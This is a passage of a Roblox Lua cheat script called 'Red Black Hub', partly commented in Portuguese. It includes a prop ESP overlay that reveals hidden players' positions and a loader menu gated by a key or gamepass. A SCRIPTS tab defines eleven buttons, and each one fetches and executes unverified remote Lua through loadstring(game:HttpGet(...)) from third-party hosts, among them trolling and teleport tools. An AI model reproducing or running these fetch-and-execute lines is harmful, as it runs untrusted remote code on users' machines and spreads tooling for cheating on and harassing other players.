			if v.B then v.B:Destroy() end
		end
		table.clear(objects)
	end

	local function update()
		if not LocalPlayer.Character then return end
		local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		if not hrp then return end

		for m,v in pairs(objects) do
			if m and m.Parent then
				local part = m:FindFirstChildWhichIsA("BasePart")
				if part then
					local dist = (hrp.Position - part.Position).Magnitude
					local nick = m.Name:sub(5)
					v.T.Text = nick .. " | " .. math.floor(dist) .. "m"
				end
			end
		end
	end

	TabESP:AddDropdown({
		Name = "PROP ESP COLOR",
		Description = "Select active prop overlay tint",
		Options = {"RED","YELLOW","BLUE","GREEN","WHITE","BLACK","PURPLE","MAGENTA"},
		Default = "RED",
		Callback = function(v)
			local key = string.lower(v)
			if PROP_COLORS[key] then
				currentColor = PROP_COLORS[key]
				updateColor()
			end
		end
	})

	TabESP:AddToggle({
		Name = "PROP ESP",
		Default = false,
		Callback = function(state)
			enabled = state

			if state then
				for _,obj in pairs(workspace:GetDescendants()) do
					if valid(obj) then create(obj) end
				end

				addConn = workspace.DescendantAdded:Connect(function(obj)
					if enabled and valid(obj) then create(obj) end
				end)

				renderConn = RunService.RenderStepped:Connect(update)
			else
				if renderConn then renderConn:Disconnect() end
				if addConn then addConn:Disconnect() end
				clear()
			end
		end
	})
end


-- ==========================================
-- TAB SCRIPTS
-- ==========================================
local Tab1 = Window:MakeTab({"SCRIPTS", "code"})

Tab1:AddButton({"ESP GUI", function()
    loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-ESP-VERIFICADOR-DE-PLAYERS-V5-27937'))()
end})

Tab1:AddButton({"YAK HUB DO PEDRO OF WAR", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Yak-Scripts/yakhub/main/yakhub.lua", true))() 
end})

Tab1:AddButton({"SANDER X", function()
    loadstring(game:HttpGet('https://rawscripts.net/raw/Brookhaven-RP-Sander-X-Hub-Latest-Version-3-16718'))()
end})

Tab1:AddButton({"RED BLACK GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/CALCULADORA-RED-BLACK-/refs/heads/main/README.md"))()
end})

Tab1:AddButton({"R4D SEM KEY", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-R4D-script-no-key-17562"))()
end})

Tab1:AddButton({"INFINITE YIELD", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Infinite-Yield_500"))()
end})

Tab1:AddButton({"TROLL GUI", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Troll-Gui-3874"))()
end})

Tab1:AddButton({"TELEPORT TOOL", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Teleport-Tool-27419"))()
end})

Tab1:AddButton({"TELEKINESIS", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Telekinesis-V5-21542"))()
end})

Tab1:AddButton({"RED BLACK HUB BY RYAN", function()
    loadstring(game:HttpGet('https://redblackhub-protected.vercel.app/script'))()
end})

Tab1:AddButton({"RED BLACK HUB BY VOLTZ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ygagga/Red-Black-hub-1.0-/refs/heads/main/673b292c795c6275.txt"))()
end})

end

--=================================
-- GUI BASE (RED BLACK / BLACK BLOOD HUB STYLE - EXTRA LARGE)
--=================================

local gui = Instance.new("ScreenGui")
gui.Name = "RBH_Loader"
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999
gui.Parent = lp:WaitForChild("PlayerGui")

-- Gradiente Vermelho para Preto (Fundo das Janelas)
local function applyDarkRedGradient(parent)
	local gradient = Instance.new("UIGradient")
	gradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 0, 0)),   -- Vermelho Sangue
		ColorSequenceKeypoint.new(0.4, Color3.fromRGB(35, 0, 0)),  -- Transição escura
		ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 5))      -- Preto Profundo
	})
	gradient.Rotation = 45
	gradient.Parent = parent
end

-- Efeito de Texto Cinza fazendo degrade para Preto e Branco (Visual Metalizado/Sombrio)
local function applyTextGradient(parent)
	local gradient = Instance.new("UIGradient")
	gradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), -- Branco
		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 120, 120)), -- Cinza
		ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 20))      -- Quase Preto
	})
	gradient.Rotation = 90
	gradient.Parent = parent
end

-- Função para criar a imagem piscando no estilo FNAF com os novos IDs atualizados
local function createFnaFHeader(parent)
	local headerImg = Instance.new("ImageLabel", parent)
	headerImg.Size = UDim2.new(0.9, 0, 0, 110) -- Aumentada a altura da imagem proporcionalmente
	headerImg.Position = UDim2.new(0.05, 0, 0.16, 0)
	headerImg.BackgroundTransparency = 1
	headerImg.BorderSizePixel = 0
	headerImg.Image = "rbxassetid://91667192204008"
	headerImg.ScaleType = Enum.ScaleType.Fit

	task.spawn(function()
		local ids = {
			"rbxassetid://91667192204008",
			"rbxassetid://116836698110493" -- ID Atualizado!
		}
		local rng = Random.new()
		while gui.Parent do
			-- Alterna de forma caótica e rápida o ID da imagem e transparência no estilo FNAF
			headerImg.Image = ids[rng:NextInteger(1, 2)]
			headerImg.ImageTransparency = rng:NextNumber(0, 0.4)
			task.wait(rng:NextNumber(0.05, 0.15))
			headerImg.ImageTransparency = 0
			task.wait(rng:NextNumber(0.1, 0.3))
		end
	end)
end

-- Frame Principal bem maior em X e Y
local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 560, 0, 400) -- X: 560 | Y: 400 (Extra Large)
main.Position = UDim2.fromScale(0.5, 0.5)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
main.BackgroundTransparency = 0.15 -- Transparência
main.BorderSizePixel = 0

applyDarkRedGradient(main)
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 24)

-- Borda profissional
local stroke = Instance.new("UIStroke", main)
stroke.Thickness = 3
stroke.Color = Color3.fromRGB(150, 0, 0)

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0, 60)
title.BackgroundTransparency = 1
title.Text = "RED BLACK HUB"
title.Font = Enum.Font.GothamBlack
title.TextSize = 36
title.TextColor3 = Color3.fromRGB(255, 255, 255)
applyTextGradient(title)

-- Cabeçalho Piscante FNAF
createFnaFHeader(main)

--=================================
-- BUTTON MAKER
--=================================

local function makeButton(parent, text, y)
	local b = Instance.new("TextButton", parent)
	b.Size = UDim2.new(0.85, 0, 0, 45) -- Botões ajustados para caixar perfeitamente na janela
	b.Position = UDim2.new(0.075, 0, y, 0)
	b.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	b.Text = text
	b.Font = Enum.Font.GothamBold
	b.TextSize = 16
	b.TextColor3 = Color3.new(1, 1, 1)
	b.BorderSizePixel = 0

	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 14)

	local bs = Instance.new("UIStroke", b)
	bs.Thickness = 2
	bs.Color = Color3.fromRGB(150, 0, 0)

	b.MouseEnter:Connect(function()
		bs.Color = Color3.fromRGB(255, 0, 0)
		b.BackgroundColor3 = Color3.fromRGB(35, 10, 10)
	end)
	b.MouseLeave:Connect(function()
		bs.Color = Color3.fromRGB(150, 0, 0)
		b.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	end)

	return b
end

-- Botões do menu principal posicionados na janela maior
local normalBtn = makeButton(main, "BASIC VERSION", 0.52)
local luxuryBtn = makeButton(main, "PRO VERSION(RECOMMENDED)", 0.72)

--=================================
-- BASIC
--=================================

normalBtn.MouseButton1Click:Connect(function()
	gui:Destroy()
	task.spawn(RunNormalHub)
end)

--=================================
-- PRO
--=================================

luxuryBtn.MouseButton1Click:Connect(function()
	main.Visible = false

	-- Janela de Key maior em X e Y proporcionalmente para acomodar todos os botões
	local keyFrame = Instance.new("Frame", gui)
	keyFrame.Size = UDim2.new(0, 560, 0, 500) -- Ajustado Y para 500 para comportar o novo botão
	keyFrame.Position = UDim2.fromScale(0.5, 0.5)
	keyFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	keyFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	keyFrame.BackgroundTransparency = 0.15
	keyFrame.BorderSizePixel = 0

	applyDarkRedGradient(keyFrame)
	Instance.new("UICorner", keyFrame).CornerRadius = UDim.new(0, 24)

	local ks = Instance.new("UIStroke", keyFrame)
	ks.Thickness = 3
	ks.Color = Color3.fromRGB(150, 0, 0)

	local keyTitle = Instance.new("TextLabel", keyFrame)
	keyTitle.Size = UDim2.new(1, 0, 0, 50)
	keyTitle.BackgroundTransparency = 1
	keyTitle.Text = "SYSTEM KEY"
	keyTitle.Font = Enum.Font.GothamBlack
	keyTitle.TextSize = 30
	keyTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	applyTextGradient(keyTitle)

	local box = Instance.new("TextBox", keyFrame)
	box.Size = UDim2.new(0.85, 0, 0, 45)
	box.Position = UDim2.new(0.075, 0, 0.12, 0)
	box.PlaceholderText = "PUT THE KEY"
	box.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
	box.TextColor3 = Color3.new(1, 1, 1)
	box.Font = Enum.Font.GothamSemibold
	box.TextSize = 16
	box.ClearTextOnFocus = false

	local boxStroke = Instance.new("UIStroke", box)
	boxStroke.Thickness = 2
	boxStroke.Color = Color3.fromRGB(80, 80, 80)

	Instance.new("UICorner", box).CornerRadius = UDim.new(0, 14)

	local getKeyBtn = makeButton(keyFrame, "GET KEY (DISCORD)", 0.24)
	local tutorialKeyBtn = makeButton(keyFrame, "TUTORIAL KEY", 0.36)
	local getPassBtn = makeButton(keyFrame, "GET GAMEPASS", 0.48)
	local passUnlockBtn = makeButton(keyFrame, "UNLOCK VIA GAMEPASS", 0.60)
	local accept = makeButton(keyFrame, "UNLOCK WITH KEY", 0.74)

	getKeyBtn.MouseButton1Click:Connect(function()
		if setclipboard then
			setclipboard(DISCORD_LINK)
		end
	end)

	tutorialKeyBtn.MouseButton1Click:Connect(function()
		if setclipboard then
			setclipboard("https://youtu.be/DztfYpCrv-w?si=TbpWyqKz6so-7so4")
		end
	end)

	getPassBtn.MouseButton1Click:Connect(function()
		if setclipboard then
			setclipboard("https://www.roblox.com/game-pass/" .. GAMEPASS_ID)
		end
	end)

	passUnlockBtn.MouseButton1Click:Connect(function()
		local ok, owns = pcall(function()
			return MarketplaceService:UserOwnsGamePassAsync(lp.UserId, GAMEPASS_ID)
		end)

		if ok and owns then
			gui:Destroy()
			task.spawn(RunLuxuryHub)
		else
			passUnlockBtn.Text = "GAMEPASS NOT OWNED"
			task.delay(1.5, function()
				passUnlockBtn.Text = "UNLOCK VIA GAMEPASS"
			end)
		end
	end)

	accept.MouseButton1Click:Connect(function()
		if box.Text == LUXURY_KEY then
			gui:Destroy()
			task.spawn(RunLuxuryHub)
		else
			box.Text = "INVALID KEY"
		end
	end)
end)
